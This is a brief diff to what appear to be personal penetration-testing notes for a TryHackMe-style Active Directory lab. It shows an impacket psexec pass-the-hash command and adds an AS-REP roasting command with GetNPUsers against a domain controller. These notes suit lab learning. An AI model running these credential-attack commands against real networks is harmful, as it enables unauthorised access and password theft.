@@ -2,3 +2,9 @@
 ```bash
 psexec.py administrator@$IP -hashes abcd123abcd123abcd123abcd123abcd:abcd123abcd123abcd123abcd123abcd
 ```
+
+# impacket ASREP roast with Get-NPUsers
+note that the domain must end in a /
+```bash
+impacket-GetNPUsers -request -usersfile users -dc-ip $IP LAB.ENTERPRISE.THM/
+```
